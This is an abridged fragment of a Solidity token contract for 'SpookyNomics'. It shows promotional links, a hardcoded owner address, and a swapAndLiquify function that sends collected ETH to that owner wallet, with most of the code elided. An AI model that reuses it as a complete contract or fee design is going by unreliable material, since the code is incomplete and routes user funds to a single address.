...
//https://www.thespookynomics.com/
//https://medium.com/@spookynomics/spookynomics-c499b48f3a62
//https://twitter.com/Spookynomicserc
//https://t.me/SpookynomicsPortal
...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x42582c9E7CaAfc08C551861958C823e1405f5b0f;
...
contract SpookyNomics is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"SpookyNomics"; 
 ...
 function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x42582c9E7CaAfc08C551861958C823e1405f5b0f), ETH_Tot);
            }
